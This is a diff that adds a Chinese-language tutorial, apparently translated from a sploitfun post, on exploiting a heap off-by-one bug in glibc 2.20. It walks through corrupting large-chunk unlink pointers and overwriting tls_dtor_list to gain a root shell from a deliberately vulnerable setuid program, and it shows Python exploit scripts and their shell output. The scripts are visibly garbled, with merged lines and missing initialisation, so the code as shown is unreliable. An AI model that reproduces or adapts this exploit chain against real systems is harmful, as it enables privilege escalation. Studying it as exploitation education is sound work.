@@ -1,0 +1,300 @@
+# 0x00 begin
+
+这个 post 偏向于复习之前 stack 部分 off by one 这样的安全问题，不过目前关注的是堆安全中的 off by one，需要有事先了解 ptmalloc2 基本的工作流程。
+实验放在 fedora 24 上面进行，glibc 版本 2.20 (下载开发仓库 checkout 出来的)。
+
+> what's is off-by-one ?
+
+其实在 stack 部分已经出现过 off by one 问题，概括而言就是:当 copy 一个字符串切目标地址的位置是在`heap`上且其源长度等于目标长度会导致字符串的尾部的`NULL`覆写下一个`chunk`的`chunk header`，这样可能会导致任意代码执行。
+
+## 0x01 the chunk of glibc
+
+在来回顾一下 glibc 中 malloc 的实现
+
+```c
+/*
+  This struct declaration is misleading (but accurate and necessary).
+  It declares a "view" into memory allowing access to necessary
+  fields at known offsets from a given base. See explanation below.
+*/
+
+struct malloc_chunk {
+
+  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
+
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+```
+其实看代码注释就能明白了，`perv_size`这个变量是如果前面的 chunk 是 free 的话那么这个字段就是记录着它的大小，如果不是 free 的话就是保护前一个 chunk 的数据；`size` 这个字段包含被分配的 chunk 的大小，其中最后三个 bit 分别是 P(PREV_INUSE) M(IS_MMAPPED) N(NON_MAIN_ARENA) flag 信息;`fd` 是指向同一个 bins 中下一个 chunk 的指针;`bk` 是指向同一个 bins 中前一个 chunk 的指针。
+
+# 0x10 practice
+
+```
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+#define SIZE 16
+
+int main(int argc, char* argv[])
+{
+
+ int fd = open("./inp_file", O_RDONLY); /* [1] */
+ if(fd == -1) {
+ printf("File open error\n");
+ fflush(stdout);
+ exit(-1);
+ }
+
+ if(strlen(argv[1])>1020) { /* [2] */
+ printf("Buffer Overflow Attempt. Exiting...\n");
+ exit(-2);
+ }
+
+ char* tmp = malloc(20-4); /* [3] */
+ char* p = malloc(1024-4); /* [4] */
+ char* p2 = malloc(1024-4); /* [5] */
+ char* p3 = malloc(1024-4); /* [6] */
+
+ read(fd,tmp,SIZE); /* [7] */
+ strcpy(p2,argv[1]); /* [8] */
+
+ free(p); /* [9] */
+}
+```
+
+编译指令,需要注意的是在这里示例里面需要暂时关闭`ASLR`,然后下面也会重新介绍两个通用 bypass 堆上`ASLR`的技术: 信息泄漏, 暴力破解。
+
+```shell
+# echo 0 > /proc/sys/kernel/randomize_va_space
+$ gcc -o consolidate_forward consolidate_forward.c
+$ sudo chown root consolidate_forward
+$ sudo chgrp root consolidate_forward
+$ sudo chmod +s consolidate_forward
+```
+
+代码中的 LINE 2 和 LINE 8 就是发生基于堆的 off by one 安全问题的关键，因为目标缓冲区和源缓冲区大小都是 1020 bytes 所有可能导致任意代码执行。
+
+> 如何构造任意代码执行？
+
+当单个`null`覆盖掉后面 chunk（p3) 的 header 会导致任意代码执行。当 chunk p2 大小为 1020 字节时会导致单个字节的溢出，由此它的的下一个 chunk 的 p3 的头部 size 由一个有意义的字节变成被覆盖成为了 null。
+
+任意代码执行的构造源于一个`NULL`覆盖掉 next chunk 的 chunk header ('p3'), 当 1020 字节的 chunk ('p2') 上发生由单字节导致的 overflow，那么后面的 chunk (p3)的
+
+> 为什么当前的 chunk 的头部 size 的 LSB 会由 prev_size 的 LSB 代替？
+
+`checked_request2size` 函数会把用户请求空间的大小值转化为内部的值(ptmalloc2 内部表示)由此需要的额外的空间来把 malloc_chunk 排序成线性。
+
+在可用的尺寸的最后 3 bit 从未被使用的情况下才会发生转化，因此它可以用来存储 P,M 与 N 标志位信息。
+
+这样的话当`malloc(1020)`来执行我们的漏洞代码，用户请求的 1020 会被转换成 `((1020 + 4 + 7) & ~7)` 1024 字节，分配 1020 字节的块的开销只有 4 字节！但是对于分配 chunk，需要大小为 8 字节的 chunk header，以便存储 prev_size 和 size informations。因此，1024 字节块的前 8 个字节将用于 chunk header，但是现在对于用户数据而言，仅剩下 1016（1024-8）字节，而不是 1020 字节。但是如上所述在 prev_size 定义中，如果分配 previous chunk（'p2'）已分配，那么 chunk（'p3'）prev_size 字段则包含用户数据。因此，位于该分配的 1024 字节块（'p2'）旁边的块（'p3'）的 prev_size 包含剩余的 4 个字节的用户数据！ 这就是为什么 LSB 的大小被覆盖用单个 NULL 字节，而不是 prev_size 的原因！
+
+堆的布局：
+
+![off-by-one-heap-heap-layout](../media/pic/heap/off-by-one-heap-layout.png)
+
+注意： 上图中攻击者的数据在后面"覆写 tls_dtor_list"章节将会解释。
+
+> 如何获取任意代码执行 ？
+
+现在我们知道了`off-by-one`错误，单个`null`字节覆写后一个 chunk p3 的 size 域的 LSB,这个单字节的`NULL`的覆写意为着 chunk p3 的 flag 被清除也就是说无论原来 chunk p2 不论原来的什么状态变成了 free。
+
+当 p2 chunk 溢出导致之前的 chunk 变成 free 状态，这种不一致会驱使 glibc 的代码去 `unlink` 已处于被分配状态的 chunk p2。
+
+正如这个 post 所见，因为任意四个字节的内存区域可能被攻击者写入数据所以 unlink 一个已经处于 allocated 状态的 chunk 可能会导致任意代码执行。
+
+在这里我们可以也会看到了因为 glibc 的 GOT 强化使得 unlink 技术变得过时，尤其是因为"corrupted double linked list"使任意代码执行变的不可能，但是在 2014 年 google 的 zero team 发现一个通过 layer chunk 成功绕过"corrupted double linked list"的方法。
+
+**unlink** (checkout from glibc-2.20)
+
+```c
+/* Take a chunk off a bin list */
+#define unlink(P, BK, FD) {                                            \
+    FD = P->fd;								      \
+    BK = P->bk;								      \
+    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
+      malloc_printerr (check_action, "corrupted double-linked list", P);      \
+    else {								      \
+        FD->bk = BK;							      \
+        BK->fd = FD;							      \
+        if (!in_smallbin_range (P->size)				      \
+            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
+            assert (P->fd_nextsize->bk_nextsize == P);			      \
+            assert (P->bk_nextsize->fd_nextsize == P);			      \
+            if (FD->fd_nextsize == NULL) {				      \
+                if (P->fd_nextsize == P)				      \
+                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
+                else {							      \
+                    FD->fd_nextsize = P->fd_nextsize;			      \
+                    FD->bk_nextsize = P->bk_nextsize;			      \
+                    P->fd_nextsize->bk_nextsize = FD;			      \
+                    P->bk_nextsize->fd_nextsize = FD;			      \
+                  }							      \
+              } else {							      \
+                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
+                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
+              }								      \
+          }								      \
+      }									      \
+}
+```
+
+在 glibc malloc 中，主要循环双链表由 malloc_chunk 的 fd 和 bk 字段维护，而次要的循环双链表链接由 malloc_chunk 的 fd_nextsize 和 bk_nextsize 字段维护。
+
+
+它看起来像损坏的双链表的加固被应用于首要（行[1]）和次要的（行[4]和[5]）双链表，但是次要循环双链表的加固只是一个调试断言语句（而不是像主循环双链表加固那样的一个 runtime 的检查），它一般不会在生产环境被编译。
+因此，次要循环双链表加固（行[4]和[5]）是没有意义，这允许我们将任意数据写入任何 4 字节存储器区域（行[6]和[7]）。
+
+仍然有较少的一些东西被清理掉，所以让我们在这里来看`unlinking`一个 large chunk 导致任意代码执行的一些细节。因为攻击者已经控制 一个已经被 free 的 large chunk。 他覆写 malloc_chunk 元素如下：
+
+* fd 应该指回一个被 free 的 chunk 的地址来绕过主双向循环链表的加固。
+* bk 也应该指回一个 free 的 chunk 的地址来绕过主双向循环链表的加固。
+* fd_next 应该指向 free_got_addr - 0x14
+* fd_nextsize 指向 system_addr
+
+但是行 6 与 7 期望 fd_nextsize 与 bk_nextsize 变的可写。fd_nextsize 变的可写(因为它指向 free_got_addr - 0x14)但是 bk_nextsize 不是可写的因为它指向属于 libc.so 的地址的 system_addr。这个问题可以通过覆写 tls_dtor_list 来解决。
+
+## Overwriting tls_dtor_list
+
+tls_dtor_list 是本地线程变量，它将在调用 exit() 期间包含函数指针列表。`__call_tls_dtors`穿过`tls_dtor_list` 与一次接着一次。因此我们可以用包含`system()`及其参数的堆的地址覆写 tls_dtors_list， `system()`将会被调用。
+
+tls_dtor_list is a thread-local variable which contains a list of function pointers to be invoked during exit(). __call_tls_dtors walks through tls_dtor_list and invokes the function one by one!! Thus if we can overwrite tls_dtor_list with a heap address which contains system and system_arg in place of func and obj of dtor_list, system() could be invoked!!
+
+![overwrite-tls-dtor-list](../media/pic/heap/over-write-tls-dtor-list.png)
+
+因此现在攻击者覆写 变成 free 的 large chunk 的 malloc_chunk 元素如下：
+Thus now attacker overwrites, to be freed large chunk’s malloc_chunk elements as said below:
+
+* fd 应该向后指向 free chunk 的地址来绕过主双向循环链表加固。
+* bk 也应该向后指向 free chunk 的地址来绕过主双向循环链表加固。
+* fd_nextsize 应该指向 tls_dtor_list - 0x14
+* bk_nextsize 应该指向包含`dtor_list`元素的堆地址。
+
+- fd_nextsize 变的可写是通过是因为 tls_dtor_list 属于 libc.so 可写段，通过反汇编 `__call_tls_dtors()`发现 tls_dtor_list 地址发现在`0xb7fe86d4`.
+- Problem of bk_next size being writable is solved since it points to heap address.
+- bk_nextsize 变的可写问题通过指向 heap 地址来解决。
+
+使用上述信息，让我们编写 exp 来攻击具有漏洞的二进制文件`consolidate_forward`.
+
+POC：
+
+```python
+#exp_try.py
+#!/usr/bin/env python
+import struct
+from subprocess import call
+
+fd = 0x0804b418
+bk = 0x0804b418
+fd_nextsize = 0xb7fe86c0
+bk_nextsize = 0x804b430
+system = 0x4e0a86e0
+sh = 0x80482ce
+
+#endianess convertion
+def conv(num):
+ return struct.pack("<I",num(fd)
+buf += conv(bk)
+buf += conv(fd_nextsize)
+buf += conv(bk_nextsize)
+buf += conv(system)
+buf += conv(sh)
+buf += "A" * 996
+
+print "Calling vulnerable program"
+call(["./consolidate_forward", buf])
+```
+
+执行上述代码没有获取 root shell，而是给了一个现有权限下的 shell。
+
+```shell
+$ python -c 'print "A"*16' > inp_file
+$ python exp_try.py 
+Calling vulnerable program
+sh-4.2$ id
+uid=1000(sploitfun) gid=1000(sploitfun) groups=1000(sploitfun),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.2$ exit
+exit
+$
+```
+
+> 为什么没有拿到 root shell？
+
+`/bin/bash`会在当 euid 不等于 uid 时候丢掉特权。我们的二进制 consolidate_forward 的 `ruid=1000` 其 `euid=0`， 所以当调用`system("/bin/bash")`时 bash 特权被丢。可以在调用`system()`之前调用`setuid(0)`，然后 `call_tls_dtors()` 一步一步调用。
+
+完整 exp：
+
+```python
+#gen_file.py
+#!/usr/bin/env python
+import struct
+
+#dtor_list
+setuid = 0x4e123e30
+setuid_arg = 0x0
+mp = 0x804b020
+nxt = 0x804b430
+
+#endianess convertion
+def conv(num):
+ return struct.pack("<I",num(setuid)
+tst += conv(setuid_arg)
+tst += conv(mp)
+tst += conv(nxt)
+
+print tst
+-----------------------------------------------------------------------------------------------------------------------------------
+#exp.py
+#!/usr/bin/env python
+import struct
+from subprocess import call
+
+fd = 0x0804b418
+bk = 0x0804b418
+fd_nextsize = 0xb7fe86c0
+bk_nextsize = 0x804b008
+system = 0x4e0a86e0
+sh = 0x80482ce
+
+#endianess convertion
+def conv(num):
+ return struct.pack("<I",num(fd)
+buf += conv(bk)
+buf += conv(fd_nextsize)
+buf += conv(bk_nextsize)
+buf += conv(system)
+buf += conv(sh)
+buf += "A" * 996
+
+print "Calling vulnerable program"
+call(["./consolidate_forward", buf])
+```
+
+执行上述代码，会给我们一个 root shell。
+
+```shell
+$ python gen_file.py > inp_file
+$ python exp.py 
+Calling vulnerable program
+sh-4.2# id
+uid=0(root) gid=1000(sploitfun) groups=0(root),10(wheel),1000(sploitfun) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.2# exit
+exit
+$
+```
+
+我们的`off-by-one`漏洞代码是向前合并 chunk，类似的也可以向后合并。类似的`off-by-one`向后合并也是一样可以被 exploited!!
+
+### reference
+
+[sploitfun](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/)
